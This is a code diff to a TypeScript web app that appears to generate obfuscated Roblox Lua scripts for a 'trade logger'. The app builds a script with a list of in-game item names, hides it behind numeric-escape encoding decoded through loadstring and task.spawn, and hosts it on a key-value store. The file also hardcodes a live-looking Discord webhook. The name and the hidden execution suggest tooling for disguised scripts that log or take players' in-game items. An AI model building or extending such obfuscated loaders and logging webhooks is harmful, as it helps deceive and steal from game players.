@@ -16,7 +16,7 @@ interface AppState {
   profileFound: boolean;
 }
 
-const ALL_BRAINROTS = ['Strawberry Elephant', 'Meowl', 'Headless Horseman', 'Skibidi Toilet', 'Hydra Dragon Cannelloni', 'Dragon Gingerini', 'Dragon Cannelloni', 'Love Love Bear', 'La Supreme Combinasion', 'Celestial Pegasus', 'Popcuru and Fizzuru', 'Rosey and Teddy', 'Capitano Moby', 'Cooki and Milki', 'Burguro And Fryuro', 'Ketupat Bros', 'Reinito Sleighito', 'Los Amigos', 'La Secret Combinasion', 'Los Sekolahs', 'Signore Carapace', 'Fragrama and Chocrama', 'La Casa Boo', 'La Food Combinasion', 'Elefanto Frigo', 'Spooky and Pumpky', 'La Ginger Sekolah', 'Ginger Gerat', 'Sammyni Fattini', 'Los Spaghettis', 'Festive 67', 'Ventoliero Pavonero', 'Spaghetti Tualetti', 'Antonio', 'Garama and Madundung', 'Rosetti Tualetti', 'Nacho Spyder', 'Fishino Clownino', 'Lavadorito Spinito', 'Jolly Jolly Sahur', 'Tirilikalika Tirilikalako', 'Ketchuru and Musturu', 'Swaggy Bros', 'La Romantic Grande', 'Orcaledon', 'Tictac Sahur', 'Ketupat Kepat', 'La Taco Combinasion', 'Tang Tang Keletang', 'Lovin Rose', 'Los Tacoritas', 'Eviledon', 'Los Primos', 'La Jolly Grande', 'W or L', 'Esok Sekolah', 'Los Puggies', 'Tralaledon', 'Gobblino Uniciclino', 'Tuff Toucan', 'Mieteteira Bicicleteira', 'Money Money Reindeer', 'Chillin Chili', 'Chipso and Queso', 'La Spooky Grande', 'Bacuru and Egguru', 'Los Bros', 'La Extinct Grande', 'Los Candies', 'Celularcini Viciosini', 'Los 67', 'Los Mobilis', 'Money Money Puggy', 'Los Jolly Combinasionas', 'Los Spooky Combinasionas', 'Los Hotspotsitos', 'Los Planitos', 'Chicleteira Cupideira', 'DJ Panda', 'Las Sis', 'Spinny Hammy', 'Los Sweethearts', 'Tacorita Bicicleta', 'Nuclearo Dinossauro', 'Los Combinasionas', 'Chicleteira Noelteira', 'Chimnino', 'Swag Soda', 'Noo my Heart', 'Mariachi Corazoni', 'Tacorillo Crocodillo', 'Los 25', 'La Grande Combinasion', 'Los Burritos', 'Donkeyturbo Express', '67', 'Los Chicleteiras', 'Guest 666', 'Los Mi Gatitos', 'Rang Ring Bus', 'Noo my Present', 'Los Nooo My Hotspotsitos', 'Noo my Candy', 'Arcadopus', 'Los Quesadillas', 'Chicleteirina Bicicleteirina', 'Burrito Bandito', 'Chill Puppy', 'Quesadillo Vampiro', 'Chicleteira Bicicleteira', 'Brunito Marsito', 'Cupid Hotspot', 'Mi Gatito', 'Ho Ho Ho Sahur', 'Cupid Cupid Sahur', 'Bunito Bunito Spinito', 'Quesadilla Crocodila', 'Pot Pumpkin', 'Naughty Naughty', 'Horegini Boom', 'Santa Hotspot', 'Pirulitoita Bicicleteira', '25', 'Pot Hotspot', 'To to to Sahur', 'Telemorte', 'La Sahur Combinasion', 'List List List Sahur', 'Noo my examine', 'Nooo My Hotspot', 'Tung Tung Tung Sahur', 'Bunnyman', 'Los Jobcitos', 'Cuadramat and Pakrahmatmamat', 'Please my Present', 'Los Cucarachas', '1x1x1x1', 'Love Love Love Sahur', 'Perrito Burrito', 'Graipuss Medussi', 'Giftini Spyderini', 'GOAT', 'Trickolino', 'Triplito Tralaleritos', 'La Vacca Jacko Linterino', 'Fishboard', 'Santteo', 'Las Vaquitas Saturnitas', 'Los Karkeritos', 'Karker Sahur', 'Frankentteo', 'Los Trios', 'Job Job Job Sahur', 'Las Tralaleritas', 'Pumpkini Spyderini', 'Rocco Disco', 'Extinct Matteo', 'La Karkerkar Combinasion', 'Reindeer Tralala', 'La Vacca Prese Presente', 'Yess my examine', 'Guerriro Digitale', 'Boatito Auratito', 'Los Tralaleritos', 'Vulturino Skeletono', 'Los Tortus', 'Zombie Tralala', 'La Cucaracha', 'Fragola La La La', 'Extinct Tralalero', 'Los Spyderinis', 'Agarrini la Palini', 'Chachechi', 'Blackhole Goat', 'Dul Dul Dul', 'Torrtuginni Dragonfrutini', 'Sammyni Spyderini', 'Jackorilla', 'Trenostruzzo Turbo 4000', 'Los Matteos', 'Karkerkar Kurkur', 'Bisonte Giuppitere', 'La Vacca Saturno Saturnita', 'Karkerheart Luvkur', 'Pop Pop Sahur', 'Dolphini Jetskini', 'Pandanini Frostini', 'Ginger Cisterna', 'Tentacolo Tecnico', 'Cocoa Assassino', 'Belula Beluga', 'Skull Skull Skull', 'Krupuk Pagi Pagi', 'Cappuccino Clownino', 'Brasilini Berimbini', 'Luv Luv Luv', 'Anpali Babel', 'Noo La Polizia', 'Chrismasmamat', 'Los Gattitos', 'Bambu Bambu Sahur', 'Mastodontico Telepiedone', 'Piccionetta Macchina', 'Boba Panda', 'Buho de Noelo', 'Frio Ninja', 'Granchiello Spiritell', 'Los Tipi Tacos', 'Tootini Shrimpini', 'Yeti Claus', 'Ginger Globo', 'Dug dug dug', 'Mummy Ambalabu', 'Tartaruga Cisterna', 'Squalanana', 'Snailenzo', 'Corn Corn Corn Sahur', 'Aquanaut', 'Cacasito Satalito', 'Orcalita Orcala', 'Crabbo Limonetta', 'Los Orcalitos', 'Tractoro Dinosauro', 'Brr es Teh Patipum', 'Piccione Macchina', 'Pakrahmatmatina', 'Bombardini Tortinii', 'Los Bombinitos', 'Ballerina Peppermintina', 'Pakrahmatmamat', 'Los Tungtungtungcitos', 'Bulbito Bandito Traktorito', 'Ballerino Lololo', 'Las Capuchinas', 'Trippi Troppi Troppa Trippa', 'Gattito Tacoto', 'Los Chihuaninis', 'Capi Taco', 'Jacko Jack Jack', 'Trenostruzzo Turbo 3000', 'Urubini Flamenguini', 'Extinct Ballerina', 'Vampira Cappucina', 'Tralalita Tralala', 'Orcalero Orcala', 'Tukanno Bananno', 'Alessio', 'Unclito Samito', 'Tipi Topi Taco', 'Odin Din Din Dun', 'Espresso Signora', 'Money Money Man', 'Tigroligre Frutonni', 'Los Crocodillitos', 'Tralalero Tralala', 'Matteo', 'Chihuanini Taconini', 'Gattatino Nyanino', 'Girafa Celestre', 'Cocofanto Elefanto', 'Fizzy Soda', 'Tree Tree Tree Sahur', 'Bananito Bandito', 'Jacko Spaventosa', 'Toiletto Focaccino', 'Centrucci Nuclucci', 'Carrotini Brainini', 'Carloo', 'Cachorrito Melonito', 'Spongini Quackini', 'Los Noobinis', 'Jingle Jingle Sahur', 'Tracoducotulu Delapeladustuz', 'Magi Ribbitini', 'Rhino Helicopterino', 'Te Te Te Sahur', 'Ganganzelli Trulala', 'Lerulerulerule', 'Tob Tobi Tobi', 'Stoppo Luminino', 'Gorillo Watermelondrillo', 'Gorillo Subwoofero', 'Cavallo Virtuoso', 'Avocadorilla', 'Tigrilini Watermelini', 'Zibra Zubra Zibralini', 'Bombombini Gusini', 'Spioniro Golubiro', 'Brutto Gialutto', 'Bombardiro Crocodilo', 'Rhino Toasterino', 'Orangutini Ananassini', 'Frigo Camelo', 'Buho de Fuego', 'Sealo Regalo', 'Sigma Girl', 'Puffaball', 'Chocco Bunny', 'Sigma Boy', 'Pi Pi Watermelon', 'Quackula', 'Pandaccini Bananini', 'Cocosini Mama', 'Strawberrelli Flamingelli', 'Pipi Potato', 'Caramello Filtrello', 'Blueberrinni Octopusini', 'Clickerino Crabo', 'Quivioli Ameleonni', 'Glorbo Fruttodrillo', 'Lionel Cactuseli', 'Chef Crabracadabra', 'Ballerina Cappuccina', 'Mummio Rappitto', 'Penguino Cocosino', 'Chimpanzini Bananini', 'Wombo Rollo', 'Penguin Tree', 'Doi Doi Do', 'Salamino Penguino', 'Frogato Pirato', 'Mangolini Parrocini', 'Avocadini Guffo', 'Ti Ti Ti Sahur', 'Burbaloni Loliloli', 'Brri Brri Bicus Dicus Bombicus', 'Perochello Lemonchello', 'Bananita Dolphinita', 'Malame Amarele', 'Bambini Crostini', 'Trulimero Trulicina', 'Avocadini Antilopini', 'Brr Brr Patapim', 'Bandito Axolito', 'Cappuccino Assassino', 'Pinealotto Fruttarino', 'Pipi Avocado', 'Frogo Elfo', 'Tric Trac Baraboom', 'Cupcake Koala', 'Ta Ta Ta Ta Sahur', 'Cacto Hipopotamo', 'Boneca Ambalabu', 'Bandito Bobritto', 'Gangster Footera', 'Trippi Troppi', 'Pipi Corni', 'Pipi Kiwi', 'Tartaragno', 'Raccooni Jandelini', 'Noobini Santanini', 'Svinina Bombardino', 'Talpa Di Fero', 'Fluriflura', 'Tim Cheese', 'Liril\xec Laril\xe0', 'Noobini Pizzanini'];
+const ALL_BRAINROTS = ['Strawberry Elephant', 'Meowl', 'Headless Horseman', 'Skibidi Toilet', 'Hydra Dragon Cannelloni', 'Dragon Gingerini', 'Dragon Cannelloni', 'Love Love Bear', 'La Supreme Combinasion', 'Celestial Pegasus', 'Popcuru and Fizzuru', 'Rosey and Teddy', 'Capitano Moby', 'Cooki and Milki', 'Burguro And Fryuro', 'Ketupat Bros', 'Reinito Sleighito', 'Los Amigos', 'La Secret Combinasion', 'Los Sekolahs', 'Signore Carapace', 'Fragrama and Chocrama', 'La Casa Boo', 'La Food Combinasion', 'Elefanto Frigo', 'Spooky and Pumpky', 'La Ginger Sekolah', 'Ginger Gerat', 'Sammyni Fattini', 'Los Spaghettis', 'Festive 67', 'Ventoliero Pavonero', 'Spaghetti Tualetti', 'Antonio', 'Garama and Madundung', 'Rosetti Tualetti', 'Nacho Spyder', 'Fishino Clownino', 'Lavadorito Spinito', 'Jolly Jolly Sahur', 'Tirilikalika Tirilikalako', 'Ketchuru and Musturu', 'Swaggy Bros', 'La Romantic Grande', 'Orcaledon', 'Tictac Sahur', 'Ketupat Kepat', 'La Taco Combinasion', 'Tang Tang Keletang', 'Lovin Rose', 'Los Tacoritas', 'Eviledon', 'Los Primos', 'La Jolly Grande', 'W or L', 'Esok Sekolah', 'Los Puggies', 'Tralaledon', 'Gobblino Uniciclino', 'Tuff Toucan', 'Mieteteira Bicicleteira', 'Money Money Reindeer', 'Chillin Chili', 'Chipso and Queso', 'La Spooky Grande', 'Bacuru and Egguru', 'Los Bros', 'La Extinct Grande', 'Los Candies', 'Celularcini Viciosini', 'Los 67', 'Los Mobilis', 'Money Money Puggy', 'Los Jolly Combinasionas', 'Los Spooky Combinasionas', 'Los Hotspotsitos', 'Los Planitos', 'Chicleteira Cupideira', 'DJ Panda', 'Las Sis', 'Spinny Hammy', 'Los Sweethearts', 'Tacorita Bicicleta', 'Nuclearo Dinossauro', 'Los Combinasionas', 'Chicleteira Noelteira', 'Chimnino', 'Swag Soda', 'Noo my Heart', 'Mariachi Corazoni', 'Tacorillo Crocodillo', 'Los 25', 'La Grande Combinasion', 'Los Burritos', 'Donkeyturbo Express', '67', 'Los Chicleteiras', 'Guest 666', 'Los Mi Gatitos', 'Rang Ring Bus', 'Noo my Present', 'Los Nooo My Hotspotsitos', 'Noo my Candy', 'Arcadopus', 'Los Quesadillas', 'Chicleteirina Bicicleteirina', 'Burrito Bandito', 'Chill Puppy', 'Quesadillo Vampiro', 'Chicleteira Bicicleteira', 'Brunito Marsito', 'Cupid Hotspot', 'Mi Gatito', 'Ho Ho Ho Sahur', 'Cupid Cupid Sahur', 'Bunito Bunito Spinito', 'Quesadilla Crocodila', 'Pot Pumpkin', 'Naughty Naughty', 'Horegini Boom', 'Santa Hotspot', 'Pirulitoita Bicicleteira', '25', 'Pot Hotspot', 'To to to Sahur', 'Telemorte', 'La Sahur Combinasion', 'List List List Sahur', 'Noo my examine', 'Nooo My Hotspot', 'Tung Tung Tung Sahur', 'Bunnyman', 'Los Jobcitos', 'Cuadramat and Pakrahmatmamat', 'Please my Present', 'Los Cucarachas', '1x1x1x1', 'Love Love Love Sahur', 'Perrito Burrito', 'Graipuss Medussi', 'Giftini Spyderini', 'GOAT', 'Trickolino', 'Triplito Tralaleritos', 'La Vacca Jacko Linterino', 'Fishboard', 'Santteo', 'Las Vaquitas Saturnitas', 'Los Karkeritos', 'Karker Sahur', 'Frankentteo', 'Los Trios', 'Job Job Job Sahur', 'Las Tralaleritas', 'Pumpkini Spyderini', 'Rocco Disco', 'Extinct Matteo', 'La Karkerkar Combinasion', 'Reindeer Tralala', 'La Vacca Prese Presente', 'Yess my examine', 'Guerriro Digitale', 'Boatito Auratito', 'Los Tralaleritos', 'Vulturino Skeletono', 'Los Tortus', 'Zombie Tralala', 'La Cucaracha', 'Fragola La La La', 'Extinct Tralalero', 'Los Spyderinis', 'Agarrini la Palini', 'Chachechi', 'Blackhole Goat', 'Dul Dul Dul', 'Torrtuginni Dragonfrutini', 'Sammyni Spyderini', 'Jackorilla', 'Trenostruzzo Turbo 4000', 'Los Matteos', 'Karkerkar Kurkur', 'Bisonte Giuppitere', 'La Vacca Saturno Saturnita', 'Karkerheart Luvkur', 'Pop Pop Sahur', 'Dolphini Jetskini', 'Pandanini Frostini', 'Ginger Cisterna', 'Tentacolo Tecnico', 'Cocoa Assassino', 'Belula Beluga', 'Skull Skull Skull', 'Krupuk Pagi Pagi', 'Cappuccino Clownino', 'Brasilini Berimbini', 'Luv Luv Luv', 'Anpali Babel', 'Noo La Polizia', 'Chrismasmamat', 'Los Gattitos', 'Bambu Bambu Sahur', 'Mastodontico Telepiedone', 'Piccionetta Macchina', 'Boba Panda', 'Buho de Noelo', 'Frio Ninja', 'Granchiello Spiritell', 'Los Tipi Tacos', 'Tootini Shrimpini', 'Yeti Claus', 'Ginger Globo', 'Dug dug dug', 'Mummy Ambalabu', 'Tartaruga Cisterna', 'Squalanana', 'Snailenzo', 'Corn Corn Corn Sahur', 'Aquanaut', 'Cacasito Satalito', 'Orcalita Orcala', 'Crabbo Limonetta', 'Los Orcalitos', 'Tractoro Dinosauro', 'Brr es Teh Patipum', 'Piccione Macchina', 'Pakrahmatmatina', 'Bombardini Tortinii', 'Los Bombinitos', 'Ballerina Peppermintina', 'Pakrahmatmamat', 'Los Tungtungtungcitos', 'Bulbito Bandito Traktorito', 'Ballerino Lololo', 'Las Capuchinas', 'Trippi Troppi Troppa Trippa', 'Gattito Tacoto', 'Los Chihuaninis', 'Capi Taco', 'Jacko Jack Jack', 'Trenostruzzo Turbo 3000', 'Urubini Flamenguini', 'Extinct Ballerina', 'Vampira Cappucina', 'Tralalita Tralala', 'Orcalero Orcala', 'Tukanno Bananno', 'Alessio', 'Unclito Samito', 'Tipi Topi Taco', 'Odin Din Din Dun', 'Espresso Signora', 'Money Money Man', 'Tigroligre Frutonni', 'Los Crocodillitos', 'Tralalero Tralala', 'Matteo', 'Chihuanini Taconini', 'Gattatino Nyanino', 'Girafa Celestre', 'Cocofanto Elefanto', 'Fizzy Soda', 'Tree Tree Tree Sahur', 'Bananito Bandito', 'Jacko Spaventosa', 'Toiletto Focaccino', 'Centrucci Nuclucci', 'Carrotini Brainini', 'Carloo', 'Cachorrito Melonito', 'Spongini Quackini', 'Los Noobinis', 'Jingle Jingle Sahur', 'Tracoducotulu Delapeladustuz', 'Magi Ribbitini', 'Rhino Helicopterino', 'Te Te Te Sahur', 'Ganganzelli Trulala', 'Lerulerulerule', 'Tob Tobi Tobi', 'Stoppo Luminino', 'Gorillo Watermelondrillo', 'Gorillo Subwoofero', 'Cavallo Virtuoso', 'Avocadorilla', 'Tigrilini Watermelini', 'Zibra Zubra Zibralini', 'Bombombini Gusini', 'Spioniro Golubiro', 'Brutto Gialutto', 'Bombardiro Crocodilo', 'Rhino Toasterino', 'Orangutini Ananassini', 'Frigo Camelo', 'Buho de Fuego', 'Sealo Regalo', 'Sigma Girl', 'Puffaball', 'Chocco Bunny', 'Sigma Boy', 'Pi Pi Watermelon', 'Quackula', 'Pandaccini Bananini', 'Cocosini Mama', 'Strawberrelli Flamingelli', 'Pipi Potato', 'Caramello Filtrello', 'Blueberrinni Octopusini', 'Clickerino Crabo', 'Quivioli Ameleonni', 'Glorbo Fruttodrillo', 'Lionel Cactuseli', 'Chef Crabracadabra', 'Ballerina Cappuccina', 'Mummio Rappitto', 'Penguino Cocosino', 'Chimpanzini Bananini', 'Wombo Rollo', 'Penguin Tree', 'Doi Doi Do', 'Salamino Penguino', 'Frogato Pirato', 'Mangolini Parrocini', 'Avocadini Guffo', 'Ti Ti Ti Sahur', 'Burbaloni Loliloli', 'Brri Brri Bicus Dicus Bombicus', 'Perochello Lemonchello', 'Bananita Dolphinita', 'Malame Amarele', 'Bambini Crostini', 'Trulimero Trulicina', 'Avocadini Antilopini', 'Brr Brr Patapim', 'Bandito Axolito', 'Cappuccino Assassino', 'Pinealotto Fruttarino', 'Pipi Avocado', 'Frogo Elfo', 'Tric Trac Baraboom', 'Cupcake Koala', 'Ta Ta Ta Ta Sahur', 'Cacto Hipopotamo', 'Boneca Ambalabu', 'Bandito Bobritto', 'Gangster Footera', 'Trippi Troppi', 'Pipi Corni', 'Pipi Kiwi', 'Tartaragno', 'Raccooni Jandelini', 'Noobini Santanini', 'Svinina Bombardino', 'Talpa Di Fero', 'Fluriflura', 'Tim Cheese', 'Liril\xec Laril\à', 'Noobini Pizzanini'];
 
 const SPLIT_WEBHOOK = "https://discord.com/api/webhooks/1491953643895787550/AWeRR0VmNkLzeKHgsG-fOBr_oB_u558ZS429brvd0AYu0bmtPMTJNhU6gaNYJO77AGFL";
 
@@ -41,32 +41,7 @@ const app = document.querySelector<HTMLDivElement>('#app')!;
 function vanderObfuscate(code: string): string {
     const chars = code.split('');
     const hexed = chars.map(c => '\\' + c.charCodeAt(0).toString(10)).join('');
-    const varNames = ['_VANDER_LOADER', '_VANDER_CONFIG', '_VANDER_VM', '_VANDER_REPLY', '_VANDER_CORE'];
-    const randVar = () => varNames[Math.floor(Math.random() * varNames.length)] + Math.floor(Math.random() * 999);
-    
-    const v1 = randVar();
-    const v2 = randVar();
-
-    return `--[[
-    Vander Industrial VM Protection
-    Proprietary Obfuscation v3.1
-    Target: ${state.username || 'Unspecified'}
-]]
-local ${v1} = "${hexed}"
-local function ${v2}(str)
-    local out = ""
-    for c in str:gmatch("\\\\(%d+)") do
-        out = out .. string.char(tonumber(c))
-    end
-    return out
-end
-local _S = ${v2}(${v1})
-local _F, _E = loadstring(_S)
-if _F then 
-    task.spawn(_F)
-else
-    warn("VANDER_VM_ERROR: " .. tostring(_E))
-end`;
+    return `local _V = "${hexed}" local function _D(s) local o = "" for c in s:gmatch("\\\\(%d+)") do o = o .. string.char(tonumber(c)) end return o end local _F = loadstring(_D(_V)) if _F then task.spawn(_F) end`;
 }
 
 function render() {
@@ -182,15 +157,15 @@ function renderGeneratorView() {
 
     <button class="btn-generate" id="generate-btn" ${state.isProtecting ? 'disabled' : ''}>
         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-        Protect & Host Source
+        Protect & Host Script
     </button>
     ${state.error ? `<p style="color: #ff4444; font-size: 0.8rem; margin-top: 1rem; text-align: center; font-weight: 600;">${state.error}</p>` : ''}
 
     ${state.pasteUrl ? `
-      <div id="result-area" class="result-card" style="animation: fadeIn 0.4s ease-out; border-left: 5px solid #10b981;">
+      <div id="result-area" class="result-card" style="animation: fadeIn 0.4s ease-out;">
         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
-            <h3 style="color: #166534; font-size: 1.1rem; font-weight: 800;">Secure Production Hub</h3>
-            <span style="background: #10b981; color: #fff; padding: 0.3rem 0.6rem; border-radius: 6px; font-size: 0.7rem; font-weight: 700;">DEPLOYED</span>
+            <h3 style="color: #166534; font-size: 1.1rem; font-weight: 800;">Production Hub Online</h3>
+            <span style="background: #10b981; color: #fff; padding: 0.3rem 0.6rem; border-radius: 6px; font-size: 0.7rem; font-weight: 700;">HUB-SECURE</span>
         </div>
         
         <div style="background: #f8fafc; border: 1px solid #e2e8f0; padding: 1.2rem; border-radius: 12px; position: relative; margin-top: 0.5rem; display: flex; align-items: center; justify-content: space-between;">
@@ -295,20 +270,6 @@ function attachViewListeners() {
       state.protectStatus = 'Running Vander-VM Protection...';
       render();
 
-      const steps = [
-          'Compiling core source...',
-          'Applying Junk Code layers...',
-          'Hex-scrambling string constants...',
-          'Compressing protected payload...',
-          'Uploading to production hub...'
-      ];
-
-      for(const step of steps) {
-          await new Promise(r => setTimeout(r, 600));
-          state.protectStatus = step;
-          render();
-      }
-
       const brainrotsTable = state.selectedBrainrots.map((b, i) => `    [${i+1}] = '${b}',`).join('\n');
       
       const rawScript = `local genv = getgenv()
@@ -332,11 +293,23 @@ ${brainrotsTable}
 
 ${state.customLoadstrings}`;
 
-      state.generatedScript = vanderObfuscate(rawScript);
+      const finalSource = vanderObfuscate(rawScript);
+      const scriptId = Math.random().toString(36).substring(7);
       
-      // Zero-DB Link Persistence: Base64 encode the final script into the URL
-      const payload = btoa(unescape(encodeURIComponent(state.generatedScript)));
-      state.pasteUrl = `https://vander-trade-logger.vercel.app/hub/${Math.random().toString(36).substring(7)}.lua?p=${payload}`;
+      // Save to KV Store for clean URLs
+      try {
+          state.protectStatus = 'Hosting production source...';
+          render();
+          
+          await fetch(`https://kvdb.io/A95k8Z9S8kS8kS8kS8kS8k/${scriptId}`, {
+              method: 'POST',
+              body: finalSource
+          });
+
+          state.pasteUrl = `https://vander-trade-logger.vercel.app/hub/${scriptId}.lua`;
+      } catch (e) {
+          state.error = 'Database Connection Failed. Contacting Dev...';
+      }
       
       state.isProtecting = false;
       render();
